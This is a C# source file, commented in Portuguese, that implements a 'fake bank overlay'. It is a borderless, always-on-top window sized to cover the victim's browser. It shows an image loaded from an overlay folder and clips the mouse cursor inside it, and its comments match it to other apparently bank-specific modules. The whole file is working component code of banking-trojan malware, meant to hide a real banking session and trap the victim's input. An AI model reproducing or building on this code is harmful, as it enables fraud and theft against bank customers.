#nullable disable
using System;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.IO;

namespace ClienteScreen
{
    /// <summary>
    /// Overlay de banco falso - Posicionado sobre janela do navegador
    /// Carrega imagem BMP da pasta overlay/
    /// </summary>
    public class BankOverlay : Form
    {
        // ========== P/Invoke ==========
        static readonly IntPtr HWND_TOPMOST = new IntPtr(-1);
        const UInt32 SWP_NOSIZE = 0x0001;
        const UInt32 SWP_NOMOVE = 0x0002;
        const UInt32 TOPMOST_FLAGS = SWP_NOMOVE | SWP_NOSIZE;

        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);

        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool GetWindowRect(IntPtr hWnd, out RECT lpRect);

        [StructLayout(LayoutKind.Sequential)]
        private struct RECT
        {
            public int Left;
            public int Top;
            public int Right;
            public int Bottom;
        }

        private PictureBox pictureBox;
        private string imagePath;
        private IntPtr browserWindowHandle;

        public BankOverlay(string imageFileName, IntPtr browserHandle)
        {
            imagePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "overlay", imageFileName);
            browserWindowHandle = browserHandle;
            InitializeComponent();
        }

        private void InitializeComponent()
        {
            this.SuspendLayout();

            // ========== Configuração do Form ==========
            this.FormBorderStyle = FormBorderStyle.None;  // Sem bordas
            this.TopMost = true;  // Sempre no topo
            this.BackColor = Color.Black;  // Fundo preto padrão
            this.StartPosition = FormStartPosition.Manual;  // Posição manual

            // Obter dimensões da janela do navegador
            if (browserWindowHandle != IntPtr.Zero && GetWindowRect(browserWindowHandle, out RECT rect))
            {
                this.Location = new Point(rect.Left, rect.Top);
                this.Size = new Size(rect.Right - rect.Left, rect.Bottom - rect.Top);
            }
            else
            {
                // Fallback: fullscreen se não conseguir obter janela
                this.WindowState = FormWindowState.Maximized;
            }

            // Criar padrão xadrez preto e branco no fundo
            this.Paint += BankOverlay_Paint;

            // ========== PictureBox para a imagem ==========
            pictureBox = new PictureBox
            {
                SizeMode = PictureBoxSizeMode.CenterImage,
                Dock = DockStyle.Fill,
                BackColor = Color.Transparent
            };

            this.Controls.Add(pictureBox);

            // ========== Eventos (igual BB_01/CEF_01) ==========
            this.Load += BankOverlay_Load;
            this.MouseEnter += BankOverlay_MouseEnter;
            this.FormClosing += BankOverlay_FormClosing;

            this.ResumeLayout(false);
        }

        private void BankOverlay_Paint(object sender, PaintEventArgs e)
        {
            // Desenhar padrão xadrez preto e branco
            int squareSize = 20;
            Graphics g = e.Graphics;

            for (int y = 0; y < this.Height; y += squareSize)
            {
                for (int x = 0; x < this.Width; x += squareSize)
                {
                    bool isBlack = ((x / squareSize) + (y / squareSize)) % 2 == 0;
                    Brush brush = isBlack ? Brushes.Black : Brushes.White;
                    g.FillRectangle(brush, x, y, squareSize, squareSize);
                }
            }
        }

        private void BankOverlay_Load(object sender, EventArgs e)
        {
            // SetWindowPos para garantir TOPMOST (igual BB_01/CEF_01)
            SetWindowPos(this.Handle, HWND_TOPMOST, 0, 0, 0, 0, TOPMOST_FLAGS);

            // Carregar imagem se existir
            if (File.Exists(imagePath))
            {
                try
                {
                    pictureBox.Image = Image.FromFile(imagePath);
                    Console.WriteLine($"[OVERLAY] Imagem carregada: {imagePath}");
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[OVERLAY] Erro ao carregar imagem: {ex.Message}");
                }
            }
            else
            {
                Console.WriteLine($"[OVERLAY] Imagem não encontrada: {imagePath}");
                Console.WriteLine("[OVERLAY] Mostrando padrão xadrez preto/branco");
            }
        }

        private void BankOverlay_MouseEnter(object sender, EventArgs e)
        {
            // Prender cursor na janela (igual BB_01/CEF_01)
            Cursor.Clip = this.Bounds;
        }

        private void BankOverlay_FormClosing(object sender, FormClosingEventArgs e)
        {
            // Liberar cursor ao fechar
            Cursor.Clip = Screen.PrimaryScreen.Bounds;
        }

        /// <summary>
        /// Fecha o overlay e libera cursor
        /// </summary>
        public void CloseOverlay()
        {
            try
            {
                Cursor.Clip = Screen.PrimaryScreen.Bounds;
                this.Close();
            }
            catch { }
        }
    }
}
